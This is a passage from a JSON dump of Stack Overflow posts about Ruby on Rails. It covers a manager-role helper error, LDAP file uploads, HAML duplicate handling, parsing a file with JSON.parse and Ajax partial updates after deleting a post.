:is_manager\n\ndef is_manager(manager_param)\n  return true if manager_param == \"Manager\"\nend\n</code></pre>\n\n<p>View:</p>\n\n<pre><code>&lt;% if signed_in? &amp;&amp; is_manager(current_user.user_type) %&gt;\n</code></pre>\n"}], "owner": {"reputation": 39, "user_id": 9387840, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/27d4a0322841f2d910f39c2cb9c36ecb?s=128&d=identicon&r=PG&f=1", "display_name": "Ant-IWH", "link": "https://stackoverflow.com/users/9387840/ant-iwh"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 1812, "favorite_count": 0, "answer_count": 2, "score": -1, "last_activity_date": 1535559321, "creation_date": 1535556506, "last_edit_date": 1535557221, "question_id": 52081173, "link": "https://stackoverflow.com/questions/52081173/argumenterror-wrong-number-of-arguments-given-0-expected-1-when-trying-to-pa", "title": "ArgumentError: Wrong Number of Arguments (given 0, expected 1) When trying to pass params to application_controller", "body": "<p>In my application, I'm trying to pass params from my view to my application_controller. The method in the application controller will be only allowing a certain part of the page to be visible if a user is a manager. I've tried this quite a few ways, this is what I have right now after some iterating.</p>\n\n<p>application_controller:</p>\n\n<pre><code>def is_manager(manager_param)\n  manager_param = params[:manager_param]\n  return true if manager_param == \"Manager\"\nend\n</code></pre>\n\n<p>and in my view:</p>\n\n<pre><code>&lt;% if signed_in? &amp;&amp; is_manager(current_user.user_type) %&gt;\n</code></pre>\n\n<p>Basically what I want to do is perform a check against the user's type, which can be User/Manager/etc, and if they're a manager, then show a certain part of the page. I currently have that functioning for an administrator, like so:</p>\n\n<p>application_controller:</p>\n\n<pre><code>def is_admin(userparam)\n  return true if userparam == true\nend\n</code></pre>\n\n<p>and in the view:</p>\n\n<pre><code>&lt;% if signed_in? &amp;&amp; is_admin(current_user.admin) %&gt;\n# Stuff only displayed for admins here\n&lt;% end %&gt;\n</code></pre>\n\n<p>However, the admin check is done against a boolean, which is why it works. The manager one is a string in the database rather than a boolean.</p>\n\n<p>I'm sure this is something dumb and simple so any help would be appreciated! Thanks</p>\n\n<p>EDIT: Full Error Message + Trace</p>\n\n<pre><code>ArgumentError in StaticPagesController#dashboard\nwrong number of arguments (given 0, expected 1)\n\n    def is_manager(manager_param)\n      manager_param = params[:manager_param]\n      return true if manager_param == \"Manager\"\n    end\n\nFull Trace:\n\napp/controllers/application_controller.rb:118:in `is_manager'\nactivesupport (5.1.4) lib/active_support/callbacks.rb:413:in `block in make_lambda'\nactivesupport (5.1.4) lib/active_support/callbacks.rb:197:in `block (2 levels) in halting'\nactionpack (5.1.4) lib/abstract_controller/callbacks.rb:12:in `block (2 levels) in &lt;module:Callbacks&gt;'\nactivesupport (5.1.4) lib/active_support/callbacks.rb:198:in `block in halting'\nactivesupport (5.1.4) lib/active_support/callbacks.rb:507:in `block in invoke_before'\nactivesupport (5.1.4) lib/active_support/callbacks.rb:507:in `each'\nactivesupport (5.1.4) lib/active_support/callbacks.rb:507:in `invoke_before'\nactivesupport (5.1.4) lib/active_support/callbacks.rb:130:in `run_callbacks'\nactionpack (5.1.4) lib/abstract_controller/callbacks.rb:19:in `process_action'\nactionpack (5.1.4) lib/action_controller/metal/rescue.rb:20:in `process_action'\nactionpack (5.1.4) lib/action_controller/metal/instrumentation.rb:32:in `block in process_action'\nactivesupport (5.1.4) lib/active_support/notifications.rb:166:in `block in instrument'\nactivesupport (5.1.4) lib/active_support/notifications/instrumenter.rb:21:in `instrument'\nactivesupport (5.1.4) lib/active_support/notifications.rb:166:in `instrument'\nactionpack (5.1.4) lib/action_controller/metal/instrumentation.rb:30:in `process_action'\nactionpack (5.1.4) lib/action_controller/metal/params_wrapper.rb:252:in `process_action'\nactiverecord (5.1.4) lib/active_record/railties/controller_runtime.rb:22:in `process_action'\nactionpack (5.1.4) lib/abstract_controller/base.rb:124:in `process'\nactionview (5.1.4) lib/action_view/rendering.rb:30:in `process'\nactionpack (5.1.4) lib/action_controller/metal.rb:189:in `dispatch'\nactionpack (5.1.4) lib/action_controller/metal.rb:253:in `dispatch'\nactionpack (5.1.4) lib/action_dispatch/routing/route_set.rb:49:in `dispatch'\nactionpack (5.1.4) lib/action_dispatch/routing/route_set.rb:31:in `serve'\nactionpack (5.1.4) lib/action_dispatch/routing/mapper.rb:16:in `block in &lt;class:Constraints&gt;'\nactionpack (5.1.4) lib/action_dispatch/routing/mapper.rb:46:in `serve'\nactionpack (5.1.4) lib/action_dispatch/journey/router.rb:50:in `block in serve'\nactionpack (5.1.4) lib/action_dispatch/journey/router.rb:33:in `each'\nactionpack (5.1.4) lib/action_dispatch/journey/router.rb:33:in `serve'\nactionpack (5.1.4) lib/action_dispatch/routing/route_set.rb:834:in `call'\nwarden (1.2.7) lib/warden/manager.rb:36:in `block in call'\nwarden (1.2.7) lib/warden/manager.rb:35:in `catch'\nwarden (1.2.7) lib/warden/manager.rb:35:in `call'\nrack (2.0.3) lib/rack/etag.rb:25:in `call'\nrack (2.0.3) lib/rack/conditional_get.rb:25:in `call'\nrack (2.0.3) lib/rack/head.rb:12:in `call'\nrack (2.0.3) lib/rack/session/abstract/id.rb:232:in `context'\nrack (2.0.3) lib/rack/session/abstract/id.rb:226:in `call'\nactionpack (5.1.4) lib/action_dispatch/middleware/cookies.rb:613:in `call'\nactiverecord (5.1.4) lib/active_record/migration.rb:556:in `call'\nactionpack (5.1.4) lib/action_dispatch/middleware/callbacks.rb:26:in `block in call'\nactivesupport (5.1.4) lib/active_support/callbacks.rb:97:in `run_callbacks'\nactionpack (5.1.4) lib/action_dispatch/middleware/callbacks.rb:24:in `call'\nactionpack (5.1.4) lib/action_dispatch/middleware/executor.rb:12:in `call'\nactionpack (5.1.4) lib/action_dispatch/middleware/debug_exceptions.rb:59:in `call'\nweb-console (3.5.1) lib/web_console/middleware.rb:135:in `call_app'\nweb-console (3.5.1) lib/web_console/middleware.rb:20:in `block in call'\nweb-console (3.5.1) lib/web_console/middleware.rb:18:in `catch'\nweb-console (3.5.1) lib/web_console/middleware.rb:18:in `call'\nactionpack (5.1.4) lib/action_dispatch/middleware/show_exceptions.rb:31:in `call'\nrailties (5.1.4) lib/rails/rack/logger.rb:36:in `call_app'\nrailties (5.1.4) lib/rails/rack/logger.rb:24:in `block in call'\nactivesupport (5.1.4) lib/active_support/tagged_logging.rb:69:in `block in tagged'\nactivesupport (5.1.4) lib/active_support/tagged_logging.rb:26:in `tagged'\nactivesupport (5.1.4) lib/active_support/tagged_logging.rb:69:in `tagged'\nrailties (5.1.4) lib/rails/rack/logger.rb:24:in `call'\nsprockets-rails (3.2.1) lib/sprockets/rails/quiet_assets.rb:13:in `call'\nactionpack (5.1.4) lib/action_dispatch/middleware/remote_ip.rb:79:in `call'\nactionpack (5.1.4) lib/action_dispatch/middleware/request_id.rb:25:in `call'\nrack (2.0.3) lib/rack/method_override.rb:22:in `call'\nrack (2.0.3) lib/rack/runtime.rb:22:in `call'\nactivesupport (5.1.4) lib/active_support/cache/strategy/local_cache_middleware.rb:27:in `call'\nactionpack (5.1.4) lib/action_dispatch/middleware/executor.rb:12:in `call'\nactionpack (5.1.4) lib/action_dispatch/middleware/static.rb:125:in `call'\nrack (2.0.3) lib/rack/sendfile.rb:111:in `call'\nrailties (5.1.4) lib/rails/engine.rb:522:in `call'\npuma (3.10.0) lib/puma/configuration.rb:225:in `call'\npuma (3.10.0) lib/puma/server.rb:605:in `handle_request'\npuma (3.10.0) lib/puma/server.rb:437:in `process_client'\npuma (3.10.0) lib/puma/server.rb:301:in `block in run'\npuma (3.10.0) lib/puma/thread_pool.rb:120:in `block in spawn_thread'\n</code></pre>\n"}, {"tags": ["ruby-on-rails", "ruby", "active-directory"], "comments": [{"owner": {"reputation": 17586, "user_id": 3482140, "user_type": "registered", "accept_rate": 83, "profile_image": "https://i.stack.imgur.com/lSFth.jpg?s=128&g=1", "display_name": "Am_I_Helpful", "link": "https://stackoverflow.com/users/3482140/am-i-helpful"}, "edited": false, "score": 0, "creation_date": 1535564922, "post_id": 52080865, "comment_id": 91117100, "body": "<i>..upload a file to the active directory..</i> - Never heard anyone has tried it; IMO probably this feature is also not available! Can you describe what type of file you want to upload, and why?"}, {"owner": {"reputation": 347, "user_id": 6186921, "user_type": "registered", "accept_rate": 40, "profile_image": "https://i.stack.imgur.com/J5OR2.jpg?s=128&g=1", "display_name": "Jeffrey M Castro", "link": "https://stackoverflow.com/users/6186921/jeffrey-m-castro"}, "edited": false, "score": 0, "creation_date": 1535622007, "post_id": 52080865, "comment_id": 91137572, "body": "any update to your situation? i have similar situation (i need to save files to external file server). i am interested.. is the &quot;file upload&quot; really needed to be handled by &quot;ldap&quot;, or can other gem do it? ex, carrierwave gem. and in this carrierwave gem possibly it has config for setting where the files will be uploaded. maybe this gem can help us? (<a href=\"https://github.com/luan/carrierwave-ftp\" rel=\"nofollow noreferrer\">github.com/luan/carrierwave-ftp</a>).."}], "owner": {"reputation": 21, "user_id": 3866450, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/PFKaB.png?s=128&g=1", "display_name": "Miguel Maury", "link": "https://stackoverflow.com/users/3866450/miguel-maury"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 202, "favorite_count": 0, "answer_count": 0, "score": 0, "last_activity_date": 1535566454, "creation_date": 1535555480, "last_edit_date": 1535566454, "question_id": 52080865, "link": "https://stackoverflow.com/questions/52080865/ruby-on-rails-and-ldap-active-directory", "title": "Ruby on Rails and LDAP (Active Directory)", "body": "<p>I am trying to connect to an active directory, I already made the connection, I need to be able to upload a file to the active directory, how can I do it, having access already?</p>\n\n<pre><code>ldap.open do |ldap|\n p 'Here and where do I have to do the manipulation of the file?'\nend\n</code></pre>\n\n<p>The login of the app, is with devise, and I need to create a function where a different user and a different password login in the active directory and can upload files there</p>\n\n<p><strong>UPDATE</strong></p>\n\n<p>The requirement is the following: I have an app in rails with authentication with gem DEVISE, it has a module that allows uploading files to a fodler in the server, these folders are in an active directory, I have a special credentials to access that folder (Active Directory), as I do for access to the directory active with credencial that I have, which are different from the login of the user in the app?</p>\n"}, {"tags": ["html", "ruby", "list", "if-statement", "haml"], "answers": [{"tags": [], "owner": {"reputation": 105308, "user_id": 2035262, "user_type": "registered", "accept_rate": 78, "profile_image": "https://i.stack.imgur.com/pPtKA.jpg?s=128&g=1", "display_name": "Aleksei Matiushkin", "link": "https://stackoverflow.com/users/2035262/aleksei-matiushkin"}, "is_accepted": false, "score": 0, "last_activity_date": 1535554960, "creation_date": 1535554960, "answer_id": 52080667, "question_id": 52080563, "link": "https://stackoverflow.com/questions/52080563/haml-each-function-with-a-list-and-duplicates/52080667#52080667", "title": "HAML .each function with a list and duplicates", "body": "<p>Use <a href=\"https://ruby-doc.org/core/Enumerable.html#method-i-each_cons\" rel=\"nofollow noreferrer\"><code>Enumerable#each_cons</code></a>:</p>\n\n<pre><code>- @x.each_cons(2) do |cur, nxt|\n  - if cur.length &lt; nxt.to_s.length\n    ...\n  - else\n    ...\n</code></pre>\n"}, {"comments": [{"owner": {"reputation": 31, "user_id": 8784836, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/f7befe4a1798a9e56bd53c1cfa1238dd?s=128&d=identicon&r=PG&f=1", "display_name": "txyz", "link": "https://stackoverflow.com/users/8784836/txyz"}, "edited": false, "score": 0, "creation_date": 1535557636, "post_id": 52081197, "comment_id": 91113214, "body": "Thank you very much for you answer. Is really helpful. :)"}, {"owner": {"reputation": 31, "user_id": 8784836, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/f7befe4a1798a9e56bd53c1cfa1238dd?s=128&d=identicon&r=PG&f=1", "display_name": "txyz", "link": "https://stackoverflow.com/users/8784836/txyz"}, "edited": false, "score": 0, "creation_date": 1535569669, "post_id": 52081197, "comment_id": 91119306, "body": "How would you use the x_uniq and x_dup in the .each() loop?"}], "tags": [], "owner": {"reputation": 446, "user_id": 8356015, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/PaYtW.jpg?s=128&g=1", "display_name": "Ravi Teja Dandu", "link": "https://stackoverflow.com/users/8356015/ravi-teja-dandu"}, "is_accepted": true, "score": 0, "last_activity_date": 1535556594, "creation_date": 1535556594, "answer_id": 52081197, "question_id": 52080563, "link": "https://stackoverflow.com/questions/52080563/haml-each-function-with-a-list-and-duplicates/52081197#52081197", "title": "HAML .each function with a list and duplicates", "body": "<p>To answer the first part of your question where <code>i[0]</code> or <code>i[1]</code> is returning a single letter instead of the element, let us examine your code:</p>\n\n<pre><code>@x.each do |i|\n</code></pre>\n\n<p>Here <code>i</code> is the element. So in the first iteration, <code>i</code> is 'american'. So when you call <code>i[0]</code> it returns the first character of the string which is <strong>a</strong> and <code>i[1]</code> returns <strong>m</strong> and both their lengths are <strong>1</strong>.</p>\n\n<p>Instead, you should modify your code like this:</p>\n\n<pre><code>%ul.list-inline\n        - @x.each_cons(2) do |current, next|\n          - if current.length &lt; next.length\n            %li            \n              %i{:class=&gt;\"fas fa-#{current} fa-2x\"}\n              %span.f6 #{current}                      \n          - else\n            %li             \n              %i{:class=&gt;\"far fa-#{next} fa-2x\"}\n              %span.f6 #{next} \n</code></pre>\n\n<p>Regarding the second part of your question, you have defined <code>@x</code> as:</p>\n\n<pre><code>@x = [\"american\", \"assistive\", \"audio\", \"blind\", \"braille\", \"closed-captioning\", \"closed-captioning\", \"deaf\", \"low\", \"phone\", \"question-circle\", \"question-circle\", \"sign\", \"tty\", \"universal\", \"wheelchair\"]\n</code></pre>\n\n<p>To fetch unique elements:</p>\n\n<pre><code>@x_uniq = @x.uniq\n</code></pre>\n\n<p>To fetch duplicates:</p>\n\n<pre><code>@x_dup = @x.each_with_object(Hash.new(0)) { |e,h| h[e] += 1 }.select{ |k,v| v &gt; 1 }.keys\n</code></pre>\n\n<p>which returns</p>\n\n<pre><code>[\"closed-captioning\", \"question-circle\"]\n</code></pre>\n\n<p>In my opinion, using the second way to filter the data and using it is a better solution than comparing elements with their lengths.</p>\n\n<p>Hope this helped.</p>\n"}], "owner": {"reputation": 31, "user_id": 8784836, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/f7befe4a1798a9e56bd53c1cfa1238dd?s=128&d=identicon&r=PG&f=1", "display_name": "txyz", "link": "https://stackoverflow.com/users/8784836/txyz"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 142, "favorite_count": 0, "accepted_answer_id": 52081197, "answer_count": 2, "score": 0, "last_activity_date": 1535556594, "creation_date": 1535554621, "question_id": 52080563, "link": "https://stackoverflow.com/questions/52080563/haml-each-function-with-a-list-and-duplicates", "title": "HAML .each function with a list and duplicates", "body": "<p>I am trying to figure out how can i distribute particular elements of a list, based on an if statement.</p>\n\n<p>This is the list:</p>\n\n<pre><code>@x = [\"american\", \"assistive\", \"audio\", \"blind\", \"braille\", \"closed-captioning\", \"closed-captioning\", \"deaf\", \"low\", \"phone\", \"question-circle\", \"question-circle\", \"sign\", \"tty\", \"universal\", \"wheelchair\"]\n</code></pre>\n\n<p>This is my haml code:</p>\n\n<pre><code>        %ul.list-inline\n        - @x.each do |i|\n          - if i[0].length &lt; i[1].length\n            %li            \n              %i{:class=&gt;\"fas fa-#{i[0]} fa-2x\"}\n              %span.f6 #{i[0]}                      \n          - else\n            %li             \n              %i{:class=&gt;\"far fa-#{i[1]} fa-2x\"}\n              %span.f6 #{i[1]} \n</code></pre>\n\n<p>What i am trying to do, is to determine the length of each string in the list and compare it to the length of the next string in the list. </p>\n\n<p>Once the second string is determined as being a duplicate, it should go under the else statement.</p>\n\n<p>The problem i am facing, is that by going with i[0], instead of the first string in the list, i am getting the first letter of the each string in the list.</p>\n\n<p>I don't know if my way of using length is the best way to solve this issue, so if anyone else has a better solution i am open for it, as long as it gets the job done.</p>\n\n<p>I am thinking that maybe if i could filter the elements in the list based on <strong>which elements are unique and which are duplicates</strong>, i could then distribute them accordingly.</p>\n\n<p>But how i do that?</p>\n\n<p>Thank you.</p>\n"}, {"tags": ["arrays", "ruby", "multidimensional-array"], "comments": [{"owner": {"reputation": 476, "user_id": 2645167, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/IEnRe.jpg?s=128&g=1", "display_name": "andriy-baran", "link": "https://stackoverflow.com/users/2645167/andriy-baran"}, "edited": false, "score": 0, "creation_date": 1535552742, "post_id": 52079114, "comment_id": 91109650, "body": "Can you attach the file you have problem with?"}, {"owner": {"reputation": 689, "user_id": 10280525, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/Ar3KN.jpg?s=128&g=1", "display_name": "Nifriz", "link": "https://stackoverflow.com/users/10280525/nifriz"}, "reply_to_user": {"reputation": 476, "user_id": 2645167, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/IEnRe.jpg?s=128&g=1", "display_name": "andriy-baran", "link": "https://stackoverflow.com/users/2645167/andriy-baran"}, "edited": false, "score": 0, "creation_date": 1535553167, "post_id": 52079114, "comment_id": 91109982, "body": "File is a TXT with the first case 10x10 I reported."}, {"owner": {"reputation": 476, "user_id": 2645167, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/IEnRe.jpg?s=128&g=1", "display_name": "andriy-baran", "link": "https://stackoverflow.com/users/2645167/andriy-baran"}, "edited": false, "score": 1, "creation_date": 1535554671, "post_id": 52079114, "comment_id": 91111097, "body": "IO.readlines returns array of strings. 320 is length of string which represents array of array in ruby language. To get 10 you need to parse the file (actually only 1 line) and instantiate ruby arrays to ask them about their length"}], "answers": [{"comments": [{"owner": {"reputation": 689, "user_id": 10280525, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/Ar3KN.jpg?s=128&g=1", "display_name": "Nifriz", "link": "https://stackoverflow.com/users/10280525/nifriz"}, "edited": false, "score": 0, "creation_date": 1535553448, "post_id": 52079184, "comment_id": 91110177, "body": "It&#39;s work! I read more about JSON and know I understand the power of parsing! Thank you both!"}], "tags": [], "owner": {"reputation": 105308, "user_id": 2035262, "user_type": "registered", "accept_rate": 78, "profile_image": "https://i.stack.imgur.com/pPtKA.jpg?s=128&g=1", "display_name": "Aleksei Matiushkin", "link": "https://stackoverflow.com/users/2035262/aleksei-matiushkin"}, "is_accepted": true, "score": 5, "last_activity_date": 1535550996, "creation_date": 1535550996, "answer_id": 52079184, "question_id": 52079114, "link": "https://stackoverflow.com/questions/52079114/how-to-find-the-number-of-elements-of-a-two-dimensional-array-read-from-a-file/52079184#52079184", "title": "How to find the number of elements of a two-dimensional array, read from a file?", "body": "<p>Instead of <code>IO#readlines</code> you should use <a href=\"http://ruby-doc.org/stdlib-2.5.1/libdoc/json/rdoc/JSON.html#method-i-parse\" rel=\"noreferrer\"><code>JSON#parse</code></a> since it\u2019s a valid json:</p>\n\n<pre><code>require 'json'    \nJSON.parse(File.read(\"test.txt\"))\n#\u21d2 [[0, 0, 1, 0, 1, 0, 1, 0, 1, 0],\n#   [0, 0, 0, 0, 0, 0, 1, 1, 0, 0],\n#   [0, 0, 0, 0, 1, 1, 1, 1, 0, 0],\n#   [0, 0, 0, 1, 0, 0, 1, 0, 0, 0],\n#   [0, 1, 1, 0, 0, 0, 0, 0, 0, 0],\n#   [0, 0, 0, 0, 0, 0, 1, 1, 1, 0],\n#   [0, 1, 1, 0, 1, 0, 1, 0, 1, 0],\n#   [0, 1, 0, 0, 0, 0, 0, 1, 0, 0],\n#   [0, 0, 0, 1, 0, 0, 0, 1, 0, 0],\n#   [0, 0, 0, 0, 0, 0, 0, 0, 0, 0]]\n</code></pre>\n"}], "owner": {"reputation": 689, "user_id": 10280525, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/Ar3KN.jpg?s=128&g=1", "display_name": "Nifriz", "link": "https://stackoverflow.com/users/10280525/nifriz"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 70, "favorite_count": 0, "accepted_answer_id": 52079184, "answer_count": 1, "score": 2, "last_activity_date": 1535572063, "creation_date": 1535550787, "last_edit_date": 1535572063, "question_id": 52079114, "link": "https://stackoverflow.com/questions/52079114/how-to-find-the-number-of-elements-of-a-two-dimensional-array-read-from-a-file", "title": "How to find the number of elements of a two-dimensional array, read from a file?", "body": "<p>I have a file. Inside the file I have stored a two-dimensional array, something like this:</p>\n\n<pre><code>[[0, 0, 1, 0, 1, 0, 1, 0, 1, 0], [0, 0, 0, 0, 0, 0, 1, 1, 0, 0], [0, 0, 0, 0, 1, 1, 1, 1, 0, 0], [0, 0, 0, 1, 0, 0, 1, 0, 0, 0], [0, 1, 1, 0, 0, 0, 0, 0, 0, 0], [0, 0, 0, 0, 0, 0, 1, 1, 1, 0], [0, 1, 1, 0, 1, 0, 1, 0, 1, 0], [0, 1, 0, 0, 0, 0, 0, 1, 0, 0], [0, 0, 0, 1, 0, 0, 0, 1, 0, 0], [0, 0, 0, 0, 0, 0, 0, 0, 0, 0]]\n</code></pre>\n\n<p>Lengths of arrays can vary and they are not always 10 elements long.</p>\n\n<p>I read the array from the file using this method:</p>\n\n<pre><code>map = IO.readlines(\"test.txt\")\n</code></pre>\n\n<p>and when i print the result using:</p>\n\n<pre><code>map.each {|x| puts \"#{x}\"}\n</code></pre>\n\n<p>the output is what I expect it to be. But if I try to get the row length using:</p>\n\n<pre><code>puts map[0].length\n</code></pre>\n\n<p>I get 320 instead of 10 (which is what I expect).</p>\n\n<p>Can someone explain me why am I getting <code>320</code> instead of <code>10</code> ?</p>\n"}, {"tags": ["ruby-on-rails", "ruby", "ajax"], "answers": [{"comments": [{"owner": {"reputation": 29, "user_id": 10066312, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/1ea7a02cf2c43157df9836d5d5fe6124?s=128&d=identicon&r=PG&f=1", "display_name": "treefoc", "link": "https://stackoverflow.com/users/10066312/treefoc"}, "edited": false, "score": 0, "creation_date": 1535621729, "post_id": 52082307, "comment_id": 91137372, "body": "After destroy, <code>@simple_form</code> in your button helper is not updated with ajax and still comes from the users_controller (where you set it the first time i presume)  Do you mean <code>@simple_post</code> ? Why is it not updated with ajax? I tried to implement your solution, but no partial actually gets updated. May the problem be my ButtonHelper?"}, {"owner": {"reputation": 4769, "user_id": 9541423, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/f816e0659e0cf40bbe0ef7224a3a56a0?s=128&d=identicon&r=PG", "display_name": "Sovalina", "link": "https://stackoverflow.com/users/9541423/sovalina"}, "reply_to_user": {"reputation": 29, "user_id": 10066312, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/1ea7a02cf2c43157df9836d5d5fe6124?s=128&d=identicon&r=PG&f=1", "display_name": "treefoc", "link": "https://stackoverflow.com/users/10066312/treefoc"}, "edited": false, "score": 0, "creation_date": 1535623127, "post_id": 52082307, "comment_id": 91138379, "body": "@treefoc yes it&#39;s <code>@simple_post</code>, sorry for the typo, i edit my answer :)"}, {"owner": {"reputation": 29, "user_id": 10066312, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/1ea7a02cf2c43157df9836d5d5fe6124?s=128&d=identicon&r=PG&f=1", "display_name": "treefoc", "link": "https://stackoverflow.com/users/10066312/treefoc"}, "edited": false, "score": 0, "creation_date": 1535631208, "post_id": 52082307, "comment_id": 91143692, "body": "So I managed every partial to work seperately: I needed to define <code>@user</code> in both the destroy and show method and also pass <code>user: @user</code> to the partials. In order to delete the correct post I have to rerender <code>_posts_actions.html.erb</code>in <code>show.js.erb</code> but the problem is: if I want to render both <code>@simple_post</code>and posts_actions it&#39;s not working. Where the simple_post should be rendered it stays empty"}, {"owner": {"reputation": 4769, "user_id": 9541423, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/f816e0659e0cf40bbe0ef7224a3a56a0?s=128&d=identicon&r=PG", "display_name": "Sovalina", "link": "https://stackoverflow.com/users/9541423/sovalina"}, "reply_to_user": {"reputation": 29, "user_id": 10066312, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/1ea7a02cf2c43157df9836d5d5fe6124?s=128&d=identicon&r=PG&f=1", "display_name": "treefoc", "link": "https://stackoverflow.com/users/10066312/treefoc"}, "edited": false, "score": 0, "creation_date": 1535631546, "post_id": 52082307, "comment_id": 91143930, "body": "I don&#39;t really see how <code>@simple_post</code> and <code>posts_actions</code> partial shouldn&#39;t be rendered at the same time. In which controller <code>show.js.erb</code>hits ? Can you post it ?"}, {"owner": {"reputation": 29, "user_id": 10066312, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/1ea7a02cf2c43157df9836d5d5fe6124?s=128&d=identicon&r=PG&f=1", "display_name": "treefoc", "link": "https://stackoverflow.com/users/10066312/treefoc"}, "edited": false, "score": 0, "creation_date": 1535632675, "post_id": 52082307, "comment_id": 91144716, "body": "Also after deleting a post the new <code>@simple_post</code> is not rendered"}, {"owner": {"reputation": 29, "user_id": 10066312, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/1ea7a02cf2c43157df9836d5d5fe6124?s=128&d=identicon&r=PG&f=1", "display_name": "treefoc", "link": "https://stackoverflow.com/users/10066312/treefoc"}, "edited": false, "score": 0, "creation_date": 1535972770, "post_id": 52082307, "comment_id": 91246664, "body": "I solved it: I basically had &quot;nested ids&quot; which messed with everything. Thanks for your help!"}], "tags": [], "owner": {"reputation": 4769, "user_id": 9541423, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/f816e0659e0cf40bbe0ef7224a3a56a0?s=128&d=identicon&r=PG", "display_name": "Sovalina", "link": "https://stackoverflow.com/users/9541423/sovalina"}, "is_accepted": true, "score": 0, "last_activity_date": 1535623845, "last_edit_date": 1535623845, "creation_date": 1535560670, "answer_id": 52082307, "question_id": 52078985, "link": "https://stackoverflow.com/questions/52078985/ruby-on-rails-deleting-a-post-with-ajax-in-navigation-and-showing-the-following/52082307#52082307", "title": "Ruby on Rails: Deleting a post with Ajax in navigation and showing the following", "body": "<p>There are several problems with your partials:</p>\n\n<ul>\n<li>First, to remove the post from your navigation you just need to update the partial, the post is already destroyed/removed at this point.</li>\n<li>After destroy, <code>@simple_post</code> in your button helper is not updated with ajax and still comes from the <code>users_controller</code> (where you set it the first time i presume)</li>\n</ul>\n\n<p>You can put your action buttons inside a new partial and specify the locals.<br>\nYou can also wrap the html inside a main div for the last update (when all the posts are deleted)</p>\n\n<p><strong>_posts_panel.html.erb:</strong></p>\n\n<pre><code>&lt;div id=\"panel\"&gt;\n  &lt;% if @user.simple_posts.empty? %&gt;\n    &lt;%= render 'simple_posts/shared/posts_empty' %&gt;\n\n  &lt;% else %&gt;\n    &lt;div id=\"post-navigation\"&gt;\n      &lt;%= render partial: 'simple_posts/shared/posts_navigation', locals: { simple_post: @simple_post } %&gt;\n    &lt;/div&gt;\n\n    &lt;div id=\"post-actions\"&gt; #&lt;-- new partial\n      &lt;%= render partial: 'simple_posts/shared/posts_actions', locals: { simple_post: @simple_post } %&gt;\n    &lt;/div&gt;\n\n    &lt;div id=\"show_post\"&gt;\n      &lt;%= render @simple_post %&gt;\n      &lt;%= yield %&gt;\n    &lt;/div&gt;\n\n  &lt;% end %&gt;\n&lt;/div&gt;\n</code></pre>\n\n<p><strong>_posts_actions.html.erb:</strong></p>\n\n<pre><code>&lt;%= simple_posts_edit_button(current_user, simple_post)%&gt;\n&lt;%= simple_posts_delete_button(current_user, simple_post)%&gt;\n</code></pre>\n\n<p>Note that you are not using the instance variable <code>@simple_post</code> anymore but the local one.</p>\n\n<hr>\n\n<p>Now you can write your js like this:</p>\n\n<p><strong>destroy.js.erb:</strong></p>\n\n<pre class=\"lang-js prettyprint-override\"><code>&lt;% if @simple_post %&gt; //&lt;-- check if \"@simple_post = current_user.posts.first\" still exists after destroy\n  $('#post-navigation').html(\"&lt;%= j render partial: 'simple_posts/shared/posts_navigation', locals: { simple_post: @simple_post } %&gt;\");\n  $('#post-actions').html(\"&lt;%= j render partial: 'simple_posts/shared/posts_actions', locals: { simple_post: @simple_post } %&gt;\");\n  $('#show_post').html(\"&lt;%= j render @simple_post %&gt;\");\n\n&lt;% else %&gt;\n  $('#panel').html(\"&lt;%= j render partial: 'simple_posts/shared/posts_empty' %&gt;\");\n&lt;% end %&gt;\n</code></pre>\n"}], "owner": {"reputation": 29, "user_id": 10066312, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/1ea7a02cf2c43157df9836d5d5fe6124?s=128&d=identicon&r=PG&f=1", "display_name": "treefoc", "link": "https://stackoverflow.com/users/10066312/treefoc"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 136, "favorite_count": 0, "accepted_answer_id": 52082307, "answer_count": 1, "score": 0, "last_activity_date": 1535632430, "creation_date": 1535550398, "last_edit_date": 1535632430, "question_id": 52078985, "link": "https://stackoverflow.com/questions/52078985/ruby-on-rails-deleting-a-post-with-ajax-in-navigation-and-showing-the-following", "title": "Ruby on Rails: Deleting a post with Ajax in navigation and showing the following", "body": "<p>Thanks for reading!</p>\n\n<p>So I'm relatively new to RoR (Rails 5) and I try to render posts of a user in a partial (<code>_posts_panel.html.erb</code>) which contains another partial: the navigation (<code>_posts_navigation.html.erb</code>). I'm using ajax to show the posts when clicked on in the navigation which is working fine. </p>\n\n<p>Now I want to use it for deleting a post. The post is destroyed when I click on the button and I managed to remove it in navigation. </p>\n\n<p>What is not working: </p>\n\n<ul>\n<li>the next post should be shown in the panel after the deletion</li>\n<li>when there is no post left I want to reload the panel because another partial (<code>_posts_empty.html.erb</code>) should be rendered</li>\n</ul>\n\n<p>My Code:</p>\n\n<p><code>_posts_panel.html.erb:</code> (it is rendered in <code>show.html.erb</code> of user)</p>\n\n<pre><code>&lt;% if @user.simple_posts.empty? %&gt;\n  &lt;%= render 